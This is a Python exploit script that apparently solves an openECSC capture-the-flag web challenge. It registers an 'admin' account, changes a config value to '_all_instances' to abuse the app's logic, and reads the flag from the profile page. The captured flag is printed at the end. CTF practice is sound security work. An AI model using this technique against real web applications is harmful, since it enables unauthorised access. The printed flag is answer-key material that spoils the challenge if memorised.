import requests

session = requests.Session()

base = "https://3a454160-13f7-4fdc-beaf-ea41d11839cb.openec.sc:1337"

print(
    session.post(
        f"{base}/register",
        data={
            "username":"admin",
            "password":"lol"
        }
    ).text
)

print(
    session.post(
        f"{base}/empty",
    ).text
)

print(
    session.post(
        f"{base}/config",
        data={
            "config":"alcohol_shelf",
            "value":"_all_instances"
        }
    ).text
)

print(
    session.post(
        f"{base}/empty",
    ).text
)

print(
    session.get(
        f"{base}/profile",
    ).text
)

"""
❯ python solve.py | grep open
                    openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}
                               value="openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}">
"""